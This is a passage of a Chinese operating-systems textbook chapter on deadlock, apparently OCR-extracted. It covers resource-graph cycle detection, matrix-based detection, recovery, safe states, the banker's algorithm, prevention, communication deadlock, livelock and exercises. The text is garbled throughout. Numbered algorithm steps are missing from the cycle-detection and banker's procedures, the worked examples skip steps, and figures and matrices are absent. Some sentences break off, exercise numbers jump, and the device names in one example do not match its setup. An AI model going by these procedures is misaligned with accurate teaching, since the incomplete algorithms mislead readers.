资源的占有情 况和进程对资源的请求情况如下：
1)A 进程持有R资源，且需要S资源。
2)B 进程不持有任何资源，但需要T资源。
3)C 进程不持有任何资源，但需要S资源。
4)D 进程持有U资源，且需要S资源和T资源。
5)E 进程持有T资源，且需要V资源。
6)F 进程持有W资源，且需要S资源。
7)G 进程持有V资源，且需要U资源。
问题是：“系统是否存在死锁?
如果存在的话，死锁涉及了哪些进程?
”
要回答这一问题，我们可以构造一张资源分配图，如图6-5a所示。
可以直接观察到这张图中包含了 一个环，如图6-5b所示。
在这个环中，我们可以看出进程D 、E 、G已经死锁。
进程A 、C 、F没有死锁， 这是因为可把S资源分配给它们中的任一个，而且它们中的任一进程完成后都能释放S, 于是其他两个进 程可依次执行，直至执行完毕。
(请注意，为了让这个例子更有趣，我们允许进程D每次请求两个资源。
)
a)
b)
图6-5 a) 资源分配图；b) 从a中抽取的环
虽然通过观察一张简单的图就能够很容易地找出死锁进程，但为了实用，我们仍然需要一个正规的 算法来检测死锁。
众所周知，有很多检测有向图环路的方法。
下面将给出一个简单的算法，这种算法对 有向图进行检测，并在发现图中有环路存在或确定无环路时结束。
这一算法使用了数据结构L,L 代表一 些节点的集合。
在这一算法中，对已经检查过的弧(有向边)进行标记，以免重复检查。
通过执行下列步骤完成上述算法：
1)对图中的每一个节点N, 将 N 作为起始点执行下面5个步骤。
2)将L初始化为空表，并清除所有的有向边标记。
4)从给定的节点开始，检测是否存在没有标记的从该节点出发的弧(有向边)。
如果存在的话，做 第5步；如果不存在，跳到第6步。
5)随机选取一条没有标记的从该节点出发的弧(有向边),标记它。
然后顺着这条弧线找到新的当 前节点，返回到第3步。
6)如果这一节点是起始节点，那么表明该图不存在任何环，算法结束。
否则意味着我们走进了死胡
同 ， 所以需要移走该节点 ， 返回到前一个节点 ， 即当前节点前面的一个节点 ， 并将它作为新的当前节点 ， 同 时 转 到 第 3 步 。
这一算法是依次将每一个节点作为一棵树的根节点 ， 并进行深度优先搜索 。
如果碰到已经遇到过的 节点 ， 那么就算找到了一个环 。
如果从任何给定的节点出发的弧都被穷举了 ， 那么就回溯到前面的节点 。
如 果 回 溯 到 根 并 且 不 能 再 深 入 下 去 ， 那 么 从 当 前 节 点 出 发 的 子 图 中 就 不 包 含 任 何 环 。
如 果 所 有 的 节 点 都 是如此 ， 那么整个图就不存在环 ， 也就是说系统不存在死锁 。
为 了 验 证 一 下 该 算 法 是 如 何 工 作 的 ， 我 们 对 图 6 - 5a运 用 该 算 法 。
算 法 对 节 点 次 序 的 要 求 是 任 意 的 ， 所 以 可 以 选 择 从 左 到 右 、 从 上 到 下 进 行 检 测 ， 首 先 从R 节 点 开 始 运 行 该 算 法 ， 然 后 依 次 从A 、B 、C 、S、
D 、T 、E 、F 开 始 。
如 果 遇 到 了 一 个 环 ， 那 么 算 法 停 止 。
使 我 们 回 溯 到A。
既 然A 没有任何没有标记的出发弧，我们再回溯到R, 从 而 完 成 了 以R 为 起 始 点 的 检 测 。
现 在 我 们 重 新 以A 为 起 始 点 启 动 该 算 法 ， 并 重 置L 为 空 表 。
这 次 检 索 也 很 快 就 结 束 了 ， 所 以 我 们 又 从 B 开 始 。
从B 节 点 我 们 顺 着 弧 到 达D, 这 时L=[B,T,E,V,G,U,D] 。
现 在 我 们 必 须 随 机 选 择 。
如
果 选S 点 ， 那 么 走 进 了 死 胡 同 并 回 溯 到D 。
接 着 选T 并 将L 更 新 为[B,T,E,V,G,U,D,T], 在 这 一
点上我们发现了环 ， 算法结束 。
这 种 算 法 远 不 是 最 佳 算 法 ， 较 好 的 一 种 算 法 参 见 (Even,1979) 。
但 毫 无 疑 问 ， 该 实 例 表 明 确 实 存 在 检测死锁的算法 。
6.4.2 每 种 类 型 多 个 资 源 的 死 锁 检 测
如果有多种相同的资源存在 ， 就需要采用另一种方法来检测死锁 。
现在我们提供一种基于矩阵的算 法 来 检 测 从P, 到 P 这n 个 进 程 中 的 死 锁 。
假 设 资 源 的 类 型 数 为m,E₁ 代 表 资 源 类 型 1 ,E₂ 代 表 资 源 类 型 2 , E 代 表 资 源 类 型i(1≤i≤m) 。
E 是 现 有 资 源 向 量(existing resource vector),代 表 每 种 已 存 在 的 资 源 总 数 。
比 如 ， 如 果 资 源 类 型 1 代 表 磁 带 机 ， 那 么E₁=2 就 表 示 系 统 有 两 台 磁 带 机 。
在 任 意 时 刻 ， 某 些 资 源 已 被 分 配 所 以 不 可 用 。
假 设A 是 可 用 资 源 向 量 (available resource vector), 那 么A 表 示 当 前 可 供 使 用 的 资 源 数 ( 即 没 有 被 分 配 的 资 源 ) 。
如 果 仅 有 的 两 台 磁 带 机 都 已 经 分 配 出 去 了 ， 那 么A 的 值 为 0 。
现 在 我 们 需 要 两 个 数 组 ：C 代 表 当 前 分 配 矩 阵 (current allocation matrix),R代 表 请 求 矩 阵 (request matrix)。
C的 第i行 代 表P₁ 当 前 所 持 有 的 每 一 种 类 型 资 源 的 资 源 数 。
所 以 ，C 代 表 进 程i所 持 有 的 资 源j的 数 量 。
同 理 ，R, 代 表P 所 需 要 的 资 源j的数量。
这四种数据结构如图6 - 6所示。
现有资源 (E₁,E₂,E₃,…,Em)
当前分配矩阵
的资源
可用资源 (A₁,A₂,A₃,…,Am)
请求矩阵
图6 - 6 死 锁 检 测 算 法 所 需 的 四 种 数 据 结 构
这四种数据结构之间有 一 个重要的恒等式。
具体地说，某种资源要么已分配要么可用。
这个结论意味着：
死锁检测算法就是基于向量的比较。
我们定义向量A和向量B之间的关系为A≤B 以表明A的每一个分 量要么等于要么小于和B向量相对应的分量。
从数学上来说，A≤B 当且仅当且A,≤B(O≤i≤m)。
每个进程起初都是没有标记过的。
算法开始会对进程做标记，进程被标记后就表明它们能够被执行， 不会进入死锁。
当算法结束时，任何没有标记的进程都是死锁进程。
该算法假定了一个最坏情形：所有 的进程在退出以前都会不停地获取资源。
死锁检测算法如下：
1)寻找一个没有标记的进程P, 对于它而言R矩阵的第i行向量小于或等于A。
3)如果没有这样的进程，那么算法终止。
算法结束时，所有没有标记过的进程(如果存在的话)都是死锁进程。
算法的第1步是寻找可以运行完毕的进程，该进程的特点是它有资源请求并且该请求可被当前的可 用资源满足。
这一选中的进程随后就被运行完毕，在这段时间内它释放自己持有的所有资源并将它们返 回到可用资源库中。
然后，这一进程被标记为完成。
如果所有的进程最终都能运行完毕的话，就不存在 死锁的情况。
如果其中某些进程一直不能运行，那么它们就是死锁进程。
虽然算法的运行过程是不确定 的(因为进程可按任何行得通的次序执行),但结果总是相同的。
作为一个例子，在图6-7中展示了用该算法检测死锁的工作过程。
这里我们有3个进程、4种资源 (可以任意地将它们标记为磁带机、绘图仪、扫描仪和蓝光光驱)。
进程1有一台扫描仪。
进程2有2 台磁带机和1个蓝光光驱。
进程3有1个绘图仪和2台扫描仪。
每一个进程都需要额外的资源，如矩阵 R 所示。
要运行死锁检测算法，首先找出哪一个进程的资源请求可被满足。
第1个不能被满足，因为没有 CD-ROM 驱动器可供使用。
由于没有打印机空闲，第2个也不能被满足。
幸运的是，第3个可被满足，所 以进程3运行并最终释放它所拥有的资源，给出
A=(2220)
接下来，进程2也可运行并释放它所拥有的资源，给出
A=(4221)
现在剩下的进程都能够运行，所以这个系统中不存在死锁。
假设图6-7的情况有所改变。
进程2需要1个蓝光 光驱、2台磁带机和1台绘图仪。
在这种情况下，所 有的请求都不能得到满足，整个系统进入死锁。
即 使我们能给进程3两个磁带驱动器和一个绘图机， 但是系统依然会在进程3请求蓝光光驱的时候发生 死 锁 。
现在我们知道了如何检测死锁(至少是在这种 预先知道静态资源请求的情况下),但问题在于何时 去检测它们。
一种方法是每当有资源请求时去检测， 毫无疑问越早发现越好，但这种方法会占用昂贵的
E=(4 2 3 1) A=(2 1 0 0)
当前分配矩阵 请求矩阵
图6-7 死锁检测算法的一个例子
CPU时间；另一种方法是每隔k分钟检测一次，或者当CPU的使用率降到某一域值时去检测。
考虑到CPU 使用效率的原因，如果死锁进程数达到一定数量，就没有多少进程可运行了，所以CPU会经常空闲。
6.4.3 从死锁中恢复
假设我们的死锁检测算法已成功地检测到了死锁，那么下一步该怎么办?
当然需要一些方法使系统重 新正常工作。
在本小节中，我们会讨论各种从死锁中恢复的方法，尽管这些方法看起来都不那么令人满意。
1.利用抢占恢复
在某些情况下，可能会临时将某个资源从它的当前所有者那里转移给另一个进程。
许多情况下，尤 其是对运行在大型主机上的批处理操作系统来说，需要人工进行干预。
比如，要将激光打印机从它的持有进程那里拿走，管理员可以收集已打印好的文档并将其堆积在一 旁。
然后，该进程被挂起(标记为不可运行)。
接着，打印机被分配给另一个进程。
当那个进程结束后， 堆在一旁的文档再被重新放回原处，原进程可重新继续工作。
在不通知原进程的情况下，将某一资源从一个进程强行取走给另一个进程使用，接着又送回，这种 做法是否可行主要取决于该资源本身的特性。
用这种方法恢复通常比较困难或者说不太可能。
若选择挂 起某个进程，则在很大程度上取决于哪一个进程拥有比较容易收回的资源。
2.利用回滚恢复
如果系统设计人员以及主机操作员了解到死锁有可能发生，他们就可以周期性地对进程进行检查点 检 查 (checkpointed)。
进程检查点检查就是将进程的状态写入一个文件以备以后重启。
该检查点中不仅包 括存储映像，还包括了资源状态，即哪些资源分配给了该进程。
为了使这一过程更有效，新的检查点不 应覆盖原有的文件，而应写到新文件中。
这样，当进程执行时，将会有一系列的检查点文件被累积起来。
一旦检测到死锁，就很容易发现需要哪些资源。
为了进行恢复，要从一个较早的检查点上开始，这 样拥有所需要资源的进程会回滚到一个时间点，在此时间点之前该进程获得了一些其他的资源。
在该检 查点后所做的所有工作都丢失。
(例如，检查点之后的输出必须丢弃，因为它们还会被重新输出。
)实际 上，是将该进程复位到一个更早的状态，那时它还没有取得所需的资源，接着就把这个资源分配给一个 死锁进程。
如果复位后的进程试图重新获得对该资源的控制，它就必须一直等到该资源可用时为止。
3.通过杀死进程恢复
最直接也是最简单的解决死锁的方法是杀死一个或若干个进程。
一种方法是杀掉环中的一个进程。
如 果走运的话，其他进程将可以继续。
如果这样做行不通的话，就需要继续杀死别的进程直到打破死锁环。
另一种方法是选一个环外的进程作为牺牲品以释放该进程的资源。
在使用这种方法时，选择一个要 被杀死的进程要特别小心，它应该正好持有环中某些进程所需的资源。
比如， 一个进程可能持有一台绘 图仪而需要一台打印机，而另一个进程可能持有一台打印机而需要一台绘图仪，因而这两个进程是死锁 的。
第三个进程可能持有另一台同样的打印机和另一台同样的绘图仪而且正在运行着。
杀死第三个进程 将释放这些资源，从而打破前两个进程的死锁。
有可能的话，最好杀死可以从头开始重新运行而且不会带来副作用的进程。
比如，编译进程可以被 重复运行，由于它只需要读入一个源文件和产生一个目标文件。
如果将它中途杀死，它的第一次运行不 会影响到第二次运行。
6.5 死锁避免
在讨论死锁检测时，我们假设当一个进程请求资源时，它一次就请求所有的资源(见图6-6中的矩
阵R) 。
不过在大多数系统中， 一次只请 求一个资源。
系统必须能够判断分配资 源是否安全，并且只能在保证安全的条 件下分配资源。
问题是：是否存在一种 算法总能做出正确的选择从而避免死 锁?
答案是肯定的，但条件是必须事先 获得一些特定的信息。
本节我们会讨论 几种死锁避免的方法。
6.5.1 资源轨迹图
避免死锁的主要算法是基于一个安 全状态的概念。
在描述算法前，我们先 讨论有关安全的概念。
通过图的方式， 能更容易理解。
虽然图的方式不能被直
打印机
绘图仪
图6-8 两个进程的资源轨迹图
接翻译成有用的算法，但它给出了一个解决问题的直观感受。
在图6-8中，我们看到一个处理两个进程和两种资源(打印机和绘图仪)的模型。
横轴表示进程A执 行的指令，纵轴表示进程B执行的指令。
进程A 在I处请求一台打印机，在I₃ 处释放，在I₂处请求一台绘 图仪，在I₄ 处释放。
进程B在I 到I₇之间需要绘图仪，在I₆ 到I₈ 之间需要打印机。
图6-8中的每一点都表示出两个进程的连接状态。
初始点为p, 没有进程执行任何指令。
如果调度程 序选中A先运行，那么在A执行一段指令后到达q, 此 时B没有执行任何指令。
在q点，如果轨迹沿垂直方 向移动，表示调度程序选中B 运行。
在单处理机情况下，所有路径都只能是水平或垂直方向的，不会出 现斜向的。
因此，运动方向一定是向上或向右，不会向左或向下，因为进程的执行不可能后退。
当进程A由 r向s 移动穿过I,线时，它请求并获得打印机。
当进程B到达t时，它请求绘图仪。
图中的阴影部分是我们感兴趣的，画着从左下到右上斜线的部分表示在该区域中两个进程都拥有打 印机，而互斥使用的规则决定了不可能进入该区域。
另一种斜线的区域表示两个进程都拥有绘图仪，且 同样不可进入。
如果系统一旦进入由I₁ 、I₂ 和I₅ 、I₆ 组成的矩形区域，那么最后一定会到达I₂ 和I₆的交叉点，这时就产 生死锁。
在该点处，A 请求绘图仪， B 请求打印机，而且这两种资源均已被分配。
这整个矩形区域都是 不安全的，因此决不能进入这个区域。
在点t处唯一的办法是运行进程A直到I₄, 过 了I₄ 后，可以按任何 路线前进，直到终点u。
需要注意的是，在点t 进程B请求资源。
系统必须决定是否分配。
如果系统把资源分配给B, 系统进 入不安全区域，最终形成死锁。
要避免死锁，应该将B挂起，直到A请求并释放绘图仪。
6.5.2 安全状态和不安全状态
我们将要研究的死锁避免算法使用了图6-6中的有关信息。
在任何时刻，当前状态包括了E 、A 、C 和R。
如果没有死锁发生，并且即使所有进程突然请求对资源的最大需求，也仍然存在某种调度次序能 够使得每一个进程运行完毕，则称该状态是安全的。
通过使用一个资源的例子很容易说明这个概念。
在 图6-9a中有一个A拥有3个资源实例但最终可能会需要9个资源实例的状态。
B 当前拥有2个资源实例，将 来共需要4个资源实例。
同样，C 拥有2个资源实例，还需要另外5个资源实例。
总共有10个资源实例，其 中有7个资源已经分配，还有3个资源是空闲的。
已有最大 数量需求
空闲：3
a)
已有最大 数量需求
空闲：1
b)
已有最大 数量需求
空闲：5
c)
已有最大 数量需求
空闲：0
d)
已有最大 数量需求
空闲：7 e)
图6-9 说 明a中的状态为安全状态
图6-9a的状态是安全的，这是由于存在一个分配序列使得所有的进程都能完成。
也就是说，这个方 案可以单独地运行B, 直到它请求并获得另外两个资源实例，从而到达图6-9b的状态。
当B完成后，就到 达了图6-9c的状态。
然后调度程序可以运行C, 再到达图6-9d的状态。
当C 完成后，到达了图6-9e的状态。
现在A可以获得它所需要的6个资源实例，并且完成。
这样系统通过仔细的调度，就能够避免死锁，所以 图6-9a的状态是安全的。
现在假设初始状态如图6-10a所示。
但这次A请求并得到另一个资源，如图6-10b所示。
我们还能找到 一个序列来完成所有工作吗?
我们来试一试。
调度程序可以运行B, 直 到B获得所需资源，如图6-10c所示。
最终，进程B完成，状态如图6-10d所示，此时进入困境了。
只有4个资源实例空闲，并且所有活动 进程都需要5个资源实例。
任何分配资源实例的序列都无法保证工作的完成。
于是，从图6-10a到图6-10b 的分配方案，从安全状态进入到了不安全状态。
从图6-10c的状态出发运行进程A 或C 也都不行。
回过头 来再看，A的请求不应该满足。
值得注意的是，不安全状态并不是死锁。
从图6-10b出发，系统能运行一段时间。
实际上，甚至有
一个进程能够完成。
而且，在A请求其他资源实例前，A 可能先释放一个资源实例，这就可以让C先完成， 从而避免了死锁。
因而，安全状态和不安全状态的区别是：从安全状态出发，系统能够保证所有进程都 能完成；而从不安全状态出发，就没有这样的保证。
已有最大 数量需求
空闲：3
a)
已有最大 数量需求
空闲：2
b)
已有最大 数量需求
空闲：0
c)
已有最大 数量需求
空闲：4
d)
图6-10 说明b中的状态为不安全状态
6.5.3 单个资源的银行家算法
已有最大 数量需求
空闲：10
a)
已有最大 数量需求
空闲：2
b)
已有最大 数量需求
空闲：1
c)
图6-11 三种资源分配状态：a) 安 全 ；b) 安 全 ；c) 不安全
6.5.4 多个资源的银行家算法
可以把银行家算法进行推广以处理多个资源。
图6-12说明了多个资源的银行家算法如何工作。
在图6- 12中我们看到两个矩阵。
左边的矩阵显示出为5个进程分别已分配的各种资源数，右边的矩
阵显示了使各进程完成运行所需的各种资源数。
这些矩阵就是图6-6中的C和R。
和一个资源的情况一样，
各进程在执行前给出其所需的全部资源量，所以 在系统的每一步中都可以计算出右边的矩阵。
检查一个状态是否安全的算法如下：
已分配资源 仍然需要的资源 图6-12 多个资源的银行家算法
1)查找右边矩阵中是否有一行，其没有被满足的资源数均小于或等于A。
如果不存在这样的行，那 么系统将会死锁，因为任何进程都无法运行结束(假定进程会一直占有资源直到它们终止为止)。
3)重复以上两步，或者直到所有的进程都标记为终止，其初始状态是安全的；或者所有进程的资源 需求都得不到满足，此时就是发生了死锁。
如果在第1步中同时有若干进程均符合条件，那么不管挑选哪一个运行都没有关系，因为可用资源 或者会增多，或者至少保持不变。
图6-12中所示的状态是安全的，若进程B 现在再请求一台打印机，可以满足它的请求，因为所得系 统状态仍然是安全的(进程D可以结束，然后是A或E结束，剩下的进程相继结束)。
假设进程B获得两台可用打印机中的一台以后，E 试图获得最后一台打印机，假若分配给E, 可用资 源向量会减到(1000),这时会引起死锁。
显然E的请求不能立即满足，必须延迟一段时间。
6.6 死锁预防
通过前面的学习我们知道，死锁避免从本质上来说是不可能的，因为它需要获知未来的请求，而这 些请求是不可知的。
那么实际的系统又是如何避免死锁的呢?
我们回顾Coffman 等人(1971)所述的四 个条件，看是否能发现线索。
如果能够保证四个条件中至少有一个不成立，那么死锁将不会产生 (Havender,1968)。
6.6.1 破坏互斥条件
先考虑破坏互斥使用条件。
如果资源不被一个进程所独占，那么死锁肯定不会产生。
当然，允许两 个进程同时使用打印机会造成混乱，通过采用假脱机打印机(spooling printer) 技术可以允许若干个进 程同时产生输出。
该模型中唯一真正请求使用物理打印机的进程是打印机守护进程，由于守护进程决不 会请求别的资源，所以不会因打印机而产生死锁。
假设守护进程被设计为在所有输出进入假脱机之前就开始打印，那么如果一个输出进程在头一轮打印 之后决定等待几个小时，打印机就可能空置。
为了避免这种现象，一般将守护进程设计成在完整的输出文 件就绪后才开始打印。
例如，若两个进程分别占用了可用的假脱机磁盘空间的一半用于输出，而任何一个
也没有能够完成输出，那么会怎样?
在这种情形下，就会有两个进程，其中每一个都完成了部分的输出， 但不是它们的全部输出，于是无法继续进行下去。
没有一个进程能够完成，结果在磁盘上出现了死锁。
不过，有一个小思路是经常可适用的。
那就是，避免分配那些不是绝对必需的资源，尽量做到尽可 能少的进程可以真正请求资源。
6.6.2 破坏占有并等待条件
Coffman 等表述的第二个条件似乎更有希望。
只要禁止已持有资源的进程再等待其他资源便可以消 除死锁。
一种实现方法是规定所有进程在开始执行前请求所需的全部资源。
如果所需的全部资源可用， 那么就将它们分配给这个进程，于是该进程肯定能够运行结束。
如果有一个或多个资源正被使用，那么 就不进行分配，进程等待。
这种方法的一个直接问题是很多进程直到运行时才知道它需要多少资源。
实际上，如果进程能够知 道它需要多少资源，就可以使用银行家算法。
另一个问题是这种方法的资源利用率不是最优的。
例如， 有一个进程先从输入磁带上读取数据，进行一小时的分析，最后会写到输出磁带上，同时会在绘图仪上 绘出。
如果所有资源都必须提前请求，这个进程就会把输出磁带机和绘图仪控制住一小时。
另一种破坏占有并等待条件的略有不同的方案是，要求当一个进程请求资源时，先暂时释放其当前 占用的所有资源，然后再尝试一次获得所需的全部资源。
6.6.3 破坏不可抢占条件
破坏第三个条件(不可抢占)也是可能的。
假若一个进程已分配到一台打印机，且正在进行打印输 出，如果由于它需要的绘图仪无法获得而强制性地把它占有的打印机抢占掉，会引起一片混乱。
但是， 一些资源可以通过虚拟化的方式来避免发生这样的情况。
假脱机打印机向磁盘输出，并且只允许打印机 守护进程访问真正的物理打印机，这种方式可以消除涉及打印机的死锁，然而却可能带来由磁盘空间导 致的死锁。
但是对于大容量磁盘，要消耗完所有的磁盘空间一般是不可能的。
然而，并不是所有的资源都可以进行类似的虚拟化。
例如，数据库中的记录或者操作系统中的表都 必须被锁定，因此存在出现死锁的可能。
6.6.4 破坏环路等待条件
现在只剩下一个条件了。
消除环路等待有几种方法。
一种是保证每一个进程在任何时刻只能占用一
个资源，如果要请求另外一个资源，它必须先释放第一个资源。
但假若进程正在把一个大文件从磁带机上读入并送到打印机打 印，那么这种限制是不可接受的。
另一种避免出现环路等待的方法是将所有资源统一编号， 如图6-13a所示。
现在的规则是：进程可以在任何时刻提出资 源请求，但是所有请求必须按照资源编号的顺序(升序)提出。
进程可以先请求打印机后请求磁带机，但不可以先请求绘图仪 后请求打印机。
图6-13 a) 对资源排序编号；b) 一 个资 源分配图
若按此规则，资源分配图中肯定不会出现环。
让我们看看在有两个进程的情形下为何可行，参看 图6-13b。
只 有 在A请求资源j且B请求资源i的情况下会产生死锁。
假设和是不同的资源，它们会具有不 同的编号。
若i>j,那 么A 不允许请求j, 因为这个编号小于A 已有资源的编号；若i<j,那 么B 不允许请求i, 因为这个编号小于B已有资源的编号。
不论哪种情况都不可能产生死锁。
对于多于两个进程的情况，同样的逻辑依然成立。
在任何时候，总有一个已分配的资源是编号最高 的。
占用该资源的进程不可能请求其他已分配的各种资源。
它或者会执行完毕，或者最坏的情形是去请 求编号更高的资源，而编号更高的资源肯定是可用的。
最终，它会结束并释放所有资源，这时其他占有 最高编号资源的进程也可以执行完。
简言之，存在一种所有进程都可以执行完毕的情景，所以不会产生
死锁。
该算法的一个变种是取消必须按升序请求资源的限制，而仅仅要求不允许进程请求比当前所占有资
源编号低的资源。
所以，若一个进程起初请求9号 和10号资源，而随后释放两者，那么它实际上相 当于从头开始，所以没有必要阻止它现在请求1号 资源。
图6-14 死锁预防方法汇总
种不同用途的数目会变得很大，以至于使编号方法根本无法使用。
死锁预防的各种方法如图6-14所示。
6.7 其他问题
虽然在一般情况下避免死锁和预防死锁并不是很有希望，但是在一些特殊的应用方面，有很多卓越 的专用算法。
例如，在很多数据库系统中， 一个经常发生的操作是请求锁住一些记录，然后更新所有锁 住的记录。
当同时有多个进程运行时，就有出现死锁的危险。
不过，在一般意义下，这种策略并不通用。
例如，在实时系统和进程控制系统中，由于一个进程缺 少一个可用资源就半途中断它，并重新开始该进程，这是不可接受的。
如果一个进程已经在网络上读写 消息、更新文件或从事任何不能安全地重复做的事，那么重新运行进程也是不可接受的。
只有当程序员 仔细地安排了程序，使得在第一阶段程序可以在任意一点停下来，并重新开始而不会产生错误，这时这 个算法才可行。
但很多应用并不能按这种方式来设计。
6.7.2 通信死锁
然而，正如我们在本章开始提到的，资源死锁是最普遍的一种类型，但不是唯一的一种。
另一种死 锁发生在通信系统中(比如说网络),即两个或两个以上进程利用发送信息来通信时。
一种普遍的情形 是进程A向进程B发送请求信息，然后阻塞直至B回复。
假设请求信息丢失，A 将阻塞以等待回复，而B 会阻塞等待一个向其发送命令的请求，因此发生死锁。
尽管如此，但这并不是一个经典的资源死锁。
A 没有占有B所需的资源，反之亦然。
事实上，并没 有完全可见的资源。
但是，根据标准的定义，在一系列进程中，每个进程因为等待另外一个进程引发的
通信死锁不能通过对资源排序(因为没有)或者通过仔细地安排调度来避免(因为任何时刻的请求 都是不允许被延迟的)。
幸运的是，另外一种技术通常可以用来中断通信死锁：超时。
在大多数网络通 信系统中，只要一个信息被发送至一个特定的地方，并等待其返回一个预期的回复，发送者就同时启动 计时器。
若计时器在回复到达前计时就停止了，则信息的发送者可以认定信息已经丢失，并重新发送 (如果需要，则一直重复)。
通过这种方式，可以避免死锁。
换种说法就是，超时策略作为一种启发式方 法可探测死锁并使进程恢复正常。
这种方式也适用于资源死锁。
另外，有些用户使用的设备驱动程序是 多变的或者有漏洞的，会导致死锁或系统冻结，这些用户也要依赖于超时策略。
当一个数据包从一个主机进入路由器时，它被放入一个缓冲区中，然后传输到另外一个路由器，再 到另一个，直至目的地。
这些缓冲区都是资源并且数目有限。
在图6-15中，每个路由器都有8个缓冲器
(实际应用中有数以百万计，但是并不能改变潜 在死锁的本质，只是改变了它的频率)。
假设路 由器A的所有数据包需要发送到B,B 的所有数 据包需要发送到C,C 的所有数据包需要发送到 D, 然 后D的所有数据包需要发送到A 。
那么没 有数据包可以移动，因为在另一端没有缓冲区。
这就是一个典型的资源死锁，尽管它发生在通 信系统中。
6.7.3 活锁
在某些情况下，当进程意识到它不能获取 所需要的下一个锁时，就会尝试礼貌地释放已经
图6-15 一个网络中的资源死锁
获得的锁，然后等待1ms, 再尝试一次。
从理论上来说，这是用来检测并预防死锁的好方法。
但是，如 果另一个进程在相同的时刻做了相同的操作，那么就像两个人在一条路上相遇并同时给对方让路一样， 相同的步调将导致双方都无法前进。
设想try_lock 原语，调用进程可以检测互斥量，要么获取它，要么返回失败。
换句话说，就是它不 会阻塞。
程序员可以将其与acquire_lock 并用，后者也试图获得锁，但是如果不能获得就会产生阻塞。
现在设想有一对并行运行的进程(可能在不同的CPU核上)用到了两个资源，如图6-16示。
每一个进程 都需要两个资源，并使用try_lock 原语试图获取锁。
如果获取失败，那么进程便会放弃它所持有的锁并 再次尝试。
在图6-16中，进程A运行时获得了资源1,进程2运行时获得了资源2。
接下来，它们分别试图 获取另一个锁并都失败了。
于是它们便会释放当前持有的锁，然后再试一次。
这个过程会一直重复，直 到有个无聊的用户(或者其他实体)前来解救其中的某个进程。
很明显，这个过程中没有进程阻塞，甚 至可以说进程正在活动，所以这不是死锁。
然而，进程并不会继续往下执行，可以称之为活锁 (livelock)。
活锁和死锁也经常出人意料地产生。
在一些系统中，进程表中容纳的进程数决定了系统允许的最大
个好主意。
图6-16 礼貌的进程可能导致活锁
大多数的操作系统(包括UNIX 和Windows) 都 忽
6.7.4 饥饿
作为一个例子，考虑打印机分配。
设想系统采用某种算法来保证打印机分配不产生死锁。
现在假设 若干进程同时都请求打印机，究竟哪一个进程能获得打印机呢?
6.8 有关死锁的研究
死锁这一问题在操作系统发展的早期就得到了详细的研究。
原因在于死锁的检测是一个经典的图论 问题，任何对数学有兴趣的研究生都可以做上3~4年的研究。
所有相关算法都已经经过反复修正，但每 次修正总是得到更古怪、更不现实的算法。
很多研究工作都已经销声匿迹，但是仍然有很多关于死锁的 论文发表。
近期关于死锁的研究方向之一是死锁避免(Jula 等人，2011)。
这种方法的主要思想是，应用程序 在死锁发生的时候检测出死锁并且保存它们的特征，从而避免在之后的运行中发生相同的死锁。
除此之
外 ，Marino 等人(2013)使用并发控制来确保死锁不会首次出现。
另外一个研究方向是死锁检测。
近期关于死锁检测的工作是由Pyla和Varadarajan(2012) 提出的。
Cai和Chan(2012) 的研究工作提出了一种动态的死锁检测机制，能够迭代地减少没有入边和出边的锁 的依赖关系。
6.9 小结
死锁是任何操作系统中都存在的潜在问题。
当一组进程中的每个进程都因等待由该组进程中的另一 进程所占有的资源而导致阻塞，死锁就发生了。
这种情况会使所有的进程都处于无限等待的状态。
一般 来讲，这是进程一直等待被其他进程占用的某些资源释放的事件。
死锁的另外一种可能情况是一组通信 进程都在等待一个消息，而通信信道却是空的，并且也没有采用超时机制。
通过跟踪哪一个状态是安全状态，哪一个状态是不安全状态，可以避免资源死锁。
安全状态就是这 样一个状态：存在一个事件序列，保证所有的进程都能完成。
不安全状态就没有这样的保证。
银行家算 法可以通过拒绝可能引起不安全状态的请求来避免死锁。
也可以在设计系统时从系统结构上预防资源死锁的发生，这样可以永久性地解决资源死锁问题。
例 如，只允许进程在任何时刻最多占有一个资源，这就破坏了循环等待环路。
也可以将所有的资源编号， 规定进程按严格的升序请求资源，这样也能预防死锁。
资源死锁并不是唯一的一种死锁。
尽管我们可以通过设置适当的超时机制来解决通信死锁，但它依 然是某些系统中潜在的问题。
习题
1.给出一个由策略产生的死锁的例子。
3.在前一题中，哪些资源是可抢占的，哪些资源 是不可抢占的?
4.在图6-1中，资源释放的顺序与获得的顺序相反， 以其他的顺序释放资源能否得到同样的结果?
5.一个资源死锁的发生有四个必要条件(互斥使 用资源、占有和等待资源、不可抢占资源和环 路等待资源)。
举一个例子说明它们对于一个资 源死锁的发生不是充分条件。
何时这些条件对 一个资源死锁的发生是充分条件?
6.城市街道很容易遇到循环阻塞的情况，我们称 之为“僵局”。
其中交叉路口被汽车堵塞，这些
汽车阻塞了它们后面的汽车，进而又阻塞了试 图进入前面路口的车辆。
城市街区的所有路口 都以一种循环的方式遍布被阻塞的汽车。
“僵局” 是一个资源死锁和同步竞争的问题。
纽约市的 预防算法称为“非阻塞盒子”,除非一个交叉路 口的后续空间是非阻塞的，否则禁止汽车进入 这个交叉路口。
这是哪种预防算法?
你能否提 供其他的预防算法来解决“僵局”问题?
7.假设四辆汽车同时从四个不同的方向驶向同一 个交叉路口，路口的每一个拐角处都有一个停 车标志。
假设交通规则要求当两辆汽车同时接 近相邻的停车标志时，左边的车必须让右边的 车先行。
那么当四辆车同时接近停车标志时， 每辆车都会让右边的车先行。
这是否是一个异 常的通信死锁?
这是否是一个资源死锁?
8.有没有可能一个资源死锁涉及一个类型的多个 单位和另一个类型的一个单位?
如果有可能，
请给出一个例子。
9.图6-3给出了资源分配图的概念，试问是否存在 不合理的资源分配图，即资源分配图在结构上 违反了使用资源的模型?
如果存在，请给出一 个例子。
10. 考虑图6-4。
假设在图6-40中，C 请求S 而不是 请求R, 这是否会导致死锁?
假设它同时请求 S和R, 情况又如何?
11.假设一个系统中存在一个资源死锁。
举一个例 子说明死锁的进程集合能够包括不在相应的资 源分配图的循环链中的进程。
13.鸵鸟算法中提到了填充进程表表项或者其他系 统表的可能。
能否给出一种能够使系统管理员 从这种状况下恢复系统的方法?
14.考虑系统的如下状态，有四个进程P1、P2、 P3 和P4, 以及五种类型的资源RS1 、RS2、 RS3 、RS4 和RS5。
列举一个在实际运用这种方法时会带来的问题。
20.一个系统是否可能处于既非死锁也不安全的状 态?
如果可以，举出例子；如果不可以，请证 明所有状态只能处于死锁或安全两种状态之一。
21. 仔细考察图6-11b, 如果D再多请求1个单位， 会导致安全状态还是不安全状态?
如果换成C 提出同样请求，情形会怎样?
22.某一系统有两个进程和三个相同的资源。
每个 进程最多需要两个资源。
这种情况下有没有可 能发生死锁?
为什么?
